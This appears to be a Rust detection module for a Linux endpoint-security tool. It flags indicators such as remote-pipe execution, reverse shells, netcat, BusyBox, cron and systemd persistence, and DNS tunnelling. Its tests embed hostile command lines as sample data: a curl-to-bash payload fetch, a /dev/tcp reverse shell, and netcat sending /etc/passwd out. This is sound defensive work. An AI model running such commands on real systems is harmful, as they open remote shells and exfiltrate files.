use serde::Serialize;

use crate::engine::proc_tree::{RelatedDnsEvent, RelatedFileEvent, RelatedNetworkEvent};
use crate::model::process::ProcessNode;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct IOCHit {
    pub rule_name: String,
    pub severity: i32,
    pub matched_value: String,
    pub description: String,
}

pub fn detect_ioc_hits(
    process: &ProcessNode,
    file_events: &[RelatedFileEvent],
    network_events: &[RelatedNetworkEvent],
    dns_events: &[RelatedDnsEvent],
) -> Vec<IOCHit> {
    let mut hits = Vec::new();

    if let Some(cmdline) = &process.cmdline {
        let lower = cmdline.to_ascii_lowercase();
        if lower.contains("curl ") && (lower.contains("| bash") || lower.contains("| sh")) {
            hits.push(IOCHit {
                rule_name: "cmd_remote_pipe_exec".to_string(),
                severity: 8,
                matched_value: cmdline.clone(),
                description: "command line downloads remote content and pipes it into a shell"
                    .to_string(),
            });
        }
        if is_reverse_shell_cmdline(&lower) {
            hits.push(IOCHit {
                rule_name: "cmd_reverse_shell".to_string(),
                severity: 9,
                matched_value: cmdline.clone(),
                description: "command line matches a shell redirection pattern commonly used for reverse shells"
                    .to_string(),
            });
        }
        if lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat ") {
            hits.push(IOCHit {
                rule_name: "cmd_netcat_session".to_string(),
                severity: 6,
                matched_value: cmdline.clone(),
                description: "command line uses a netcat-like tool, which is commonly repurposed for ad hoc shells and data transfer"
                    .to_string(),
            });
        }
        if lower.contains("busybox ") {
            hits.push(IOCHit {
                rule_name: "cmd_busybox_lolbin".to_string(),
                severity: 6,
                matched_value: cmdline.clone(),
                description: "command line uses BusyBox, a common multi-call binary often abused as a LOLBin on minimal Linux hosts"
                    .to_string(),
            });
        }
    }

    for event in file_events {
        if event.sensitive {
            hits.push(IOCHit {
                rule_name: "sensitive_file_access".to_string(),
                severity: 7,
                matched_value: event.file_path.clone(),
                description: "process accessed a sensitive file path".to_string(),
            });
        }
        if is_cron_persistence_path(&event.file_path) {
            hits.push(IOCHit {
                rule_name: "cron_persistence".to_string(),
                severity: 8,
                matched_value: event.file_path.clone(),
                description: "process touched a cron persistence path".to_string(),
            });
        }
        if is_systemd_persistence_path(&event.file_path) {
            hits.push(IOCHit {
                rule_name: "systemd_persistence".to_string(),
                severity: 8,
                matched_value: event.file_path.clone(),
                description: "process touched a systemd service persistence path".to_string(),
            });
        }
    }

    for event in network_events {
        if event.lateral_movement_hint {
            hits.push(IOCHit {
                rule_name: "lateral_movement_hint".to_string(),
                severity: 7,
                matched_value: format!(
                    "{}:{}",
                    event.remote_addr.as_deref().unwrap_or("-"),
                    event.remote_port.unwrap_or_default()
                ),
                description:
                    "process connected to an internal service commonly used for lateral movement"
                        .to_string(),
            });
        }
    }

    for event in dns_events.iter().filter(|event| event.high_entropy) {
        hits.push(IOCHit {
            rule_name: "dns_high_entropy_query".to_string(),
            severity: 7,
            matched_value: event.query.clone(),
            description: format!(
                "dns query has elevated entropy ({:.2}) and may indicate tunneling or encoded beacon traffic",
                event.entropy
            ),
        });
    }

    hits
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AttackTag {
    pub tactic: String,
    pub technique_hint: String,
    pub reason: String,
}

pub fn infer_attack_tags(
    process: &ProcessNode,
    file_events: &[RelatedFileEvent],
    network_events: &[RelatedNetworkEvent],
    dns_events: &[RelatedDnsEvent],
) -> Vec<AttackTag> {
    let mut tags = Vec::new();

    if let Some(cmdline) = &process.cmdline {
        let lower = cmdline.to_ascii_lowercase();
        if lower.contains("curl ") && (lower.contains("| bash") || lower.contains("| sh")) {
            tags.push(AttackTag {
                tactic: "execution".to_string(),
                technique_hint: "remote_payload_execution".to_string(),
                reason: "command line suggests downloaded content was executed directly"
                    .to_string(),
            });
        }
        if is_reverse_shell_cmdline(&lower) {
            tags.push(AttackTag {
                tactic: "command_and_control".to_string(),
                technique_hint: "reverse_shell".to_string(),
                reason: "command line matches an interactive shell redirected over a TCP socket"
                    .to_string(),
            });
        }
        if lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat ") {
            tags.push(AttackTag {
                tactic: "command_and_control".to_string(),
                technique_hint: "netcat_session".to_string(),
                reason: "command line uses a netcat-like utility for direct socket interaction"
                    .to_string(),
            });
        }
        if lower.contains("busybox ") {
            tags.push(AttackTag {
                tactic: "execution".to_string(),
                technique_hint: "busybox_lolbin".to_string(),
                reason: "command line invokes BusyBox, which is commonly reused as a living-off-the-land binary".to_string(),
            });
        }
    }

    if file_events.iter().any(|event| event.sensitive) {
        tags.push(AttackTag {
            tactic: "collection".to_string(),
            technique_hint: "sensitive_file_access".to_string(),
            reason: "process accessed sensitive local files".to_string(),
        });
    }

    if file_events
        .iter()
        .any(|event| is_cron_persistence_path(&event.file_path))
    {
        tags.push(AttackTag {
            tactic: "persistence".to_string(),
            technique_hint: "cron_persistence".to_string(),
            reason: "process touched a cron configuration path".to_string(),
        });
    }

    if file_events
        .iter()
        .any(|event| is_systemd_persistence_path(&event.file_path))
    {
        tags.push(AttackTag {
            tactic: "persistence".to_string(),
            technique_hint: "systemd_persistence".to_string(),
            reason: "process touched a systemd unit path".to_string(),
        });
    }

    if network_events
        .iter()
        .any(|event| event.lateral_movement_hint)
    {
        tags.push(AttackTag {
            tactic: "lateral_movement".to_string(),
            technique_hint: "internal_service_connection".to_string(),
            reason:
                "process connected to an internal service port commonly used in lateral movement"
                    .to_string(),
        });
    }

    if dns_events.iter().any(|event| event.high_entropy) {
        tags.push(AttackTag {
            tactic: "command_and_control".to_string(),
            technique_hint: "dns_tunnel_entropy".to_string(),
            reason: "dns queries contain high-entropy names consistent with tunneling or encoded beacon traffic".to_string(),
        });
    }

    tags
}

fn is_reverse_shell_cmdline(lower: &str) -> bool {
    (lower.contains("bash -i") || lower.contains("sh -i"))
        && (lower.contains("/dev/tcp/") || lower.contains("0>&1") || lower.contains(">& /dev/tcp/"))
}

fn is_cron_persistence_path(path: &str) -> bool {
    path.contains("/etc/crontab")
        || path.contains("/etc/cron.d")
        || path.contains("/etc/cron.daily")
        || path.contains("/etc/cron.hourly")
        || path.contains("/etc/cron.weekly")
        || path.contains("/etc/cron.monthly")
        || path.contains("/var/spool/cron")
}

fn is_systemd_persistence_path(path: &str) -> bool {
    path.contains("/etc/systemd/system")
}

#[cfg(test)]
mod tests {
    use crate::engine::proc_tree::{RelatedDnsEvent, RelatedFileEvent, RelatedNetworkEvent};
    use crate::model::process::ProcessNode;

    use super::{detect_ioc_hits, infer_attack_tags};

    #[test]
    fn detect_ioc_and_attack_tags_from_sample_behavior() {
        let process = ProcessNode {
            process_key: "tracee:4242:1".to_string(),
            pid: 4242,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -c curl http://10.0.0.5/payload.sh | bash".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let file_events = vec![RelatedFileEvent {
            pid: 4242,
            event_name: "security_file_open".to_string(),
            file_path: "/etc/shadow".to_string(),
            flags: Some("O_RDONLY".to_string()),
            sensitive: true,
            observed_at: 1,
        }];
        let network_events = vec![RelatedNetworkEvent {
            pid: 4242,
            event_name: "tcp_connect".to_string(),
            remote_addr: Some("10.0.0.9".to_string()),
            remote_port: Some(22),
            external: false,
            lateral_movement_hint: true,
            observed_at: 2,
        }];

        let iocs = detect_ioc_hits(&process, &file_events, &network_events, &[]);
        let tags = infer_attack_tags(&process, &file_events, &network_events, &[]);

        assert!(
            iocs.iter()
                .any(|ioc| ioc.rule_name == "cmd_remote_pipe_exec")
        );
        assert!(
            iocs.iter()
                .any(|ioc| ioc.rule_name == "sensitive_file_access")
        );
        assert!(
            iocs.iter()
                .any(|ioc| ioc.rule_name == "lateral_movement_hint")
        );

        assert!(tags.iter().any(|tag| tag.tactic == "execution"));
        assert!(tags.iter().any(|tag| tag.tactic == "collection"));
        assert!(tags.iter().any(|tag| tag.tactic == "lateral_movement"));
    }

    #[test]
    fn detect_reverse_shell_ioc_from_cmdline() {
        let process = ProcessNode {
            process_key: "tracee:5252:1".to_string(),
            pid: 5252,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let iocs = detect_ioc_hits(&process, &[], &[], &[]);
        let tags = infer_attack_tags(&process, &[], &[], &[]);

        assert!(iocs.iter().any(|ioc| ioc.rule_name == "cmd_reverse_shell"));
        assert!(tags.iter().any(|tag| tag.technique_hint == "reverse_shell"));
    }

    #[test]
    fn detect_netcat_ioc_from_cmdline() {
        let process = ProcessNode {
            process_key: "tracee:6262:1".to_string(),
            pid: 6262,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -lc nc 10.0.0.5 4444 < /etc/passwd".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let iocs = detect_ioc_hits(&process, &[], &[], &[]);
        let tags = infer_attack_tags(&process, &[], &[], &[]);

        assert!(iocs.iter().any(|ioc| ioc.rule_name == "cmd_netcat_session"));
        assert!(
            tags.iter()
                .any(|tag| tag.technique_hint == "netcat_session")
        );
    }

    #[test]
    fn detect_busybox_lolbin_ioc_from_cmdline() {
        let process = ProcessNode {
            process_key: "tracee:7272:1".to_string(),
            pid: 7272,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -lc busybox nc 10.0.0.5 4444 < /etc/passwd".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let iocs = detect_ioc_hits(&process, &[], &[], &[]);
        let tags = infer_attack_tags(&process, &[], &[], &[]);

        assert!(iocs.iter().any(|ioc| ioc.rule_name == "cmd_busybox_lolbin"));
        assert!(
            tags.iter()
                .any(|tag| tag.technique_hint == "busybox_lolbin")
        );
    }

    #[test]
    fn detect_persistence_paths_from_file_events() {
        let process = ProcessNode {
            process_key: "tracee:8282:1".to_string(),
            pid: 8282,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash -lc install persistence".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let file_events = vec![
            RelatedFileEvent {
                pid: 8282,
                event_name: "security_file_open".to_string(),
                file_path: "/etc/cron.d/trace-lens".to_string(),
                flags: Some("O_WRONLY".to_string()),
                sensitive: true,
                observed_at: 1,
            },
            RelatedFileEvent {
                pid: 8282,
                event_name: "security_file_open".to_string(),
                file_path: "/etc/systemd/system/trace-lens.service".to_string(),
                flags: Some("O_WRONLY".to_string()),
                sensitive: true,
                observed_at: 2,
            },
        ];

        let iocs = detect_ioc_hits(&process, &file_events, &[], &[]);
        let tags = infer_attack_tags(&process, &file_events, &[], &[]);

        assert!(iocs.iter().any(|ioc| ioc.rule_name == "cron_persistence"));
        assert!(
            iocs.iter()
                .any(|ioc| ioc.rule_name == "systemd_persistence")
        );
        assert!(
            tags.iter()
                .any(|tag| tag.technique_hint == "cron_persistence")
        );
        assert!(
            tags.iter()
                .any(|tag| tag.technique_hint == "systemd_persistence")
        );
    }

    #[test]
    fn detect_high_entropy_dns_ioc() {
        let process = ProcessNode {
            process_key: "tracee:7000:1".to_string(),
            pid: 7000,
            ppid: Some(1),
            process_guid: None,
            parent_process_key: None,
            exe_path: Some("/usr/bin/bash".to_string()),
            comm: Some("bash".to_string()),
            cmdline: Some("bash".to_string()),
            cwd: None,
            uid: Some(0),
            gid: None,
            loginuid: None,
            session_id: None,
            start_time: 1,
            exit_time: None,
            namespace_pid: None,
            namespace_mnt: None,
            namespace_net: None,
            trust_score: 50,
            trust_reasons_json: None,
            flags_json: None,
        };

        let dns_events = vec![RelatedDnsEvent {
            pid: 7000,
            event_name: "net_packet_dns_request".to_string(),
            query: "dGhpcy1pcy1hLWRucy10dW5uZWwtcGF5bG9hZA.example.com".to_string(),
            query_type: Some("TXT".to_string()),
            query_class: Some("IN".to_string()),
            src: Some("127.0.0.1".to_string()),
            dst: Some("8.8.8.8".to_string()),
            src_port: Some(53000),
            dst_port: Some(53),
            entropy: 4.7,
            high_entropy: true,
            observed_at: 1,
        }];

        let iocs = detect_ioc_hits(&process, &[], &[], &dns_events);
        let tags = infer_attack_tags(&process, &[], &[], &dns_events);

        assert!(
            iocs.iter()
                .any(|ioc| ioc.rule_name == "dns_high_entropy_query")
        );
        assert!(
            tags.iter()
                .any(|tag| tag.technique_hint == "dns_tunnel_entropy")
        );
    }
}
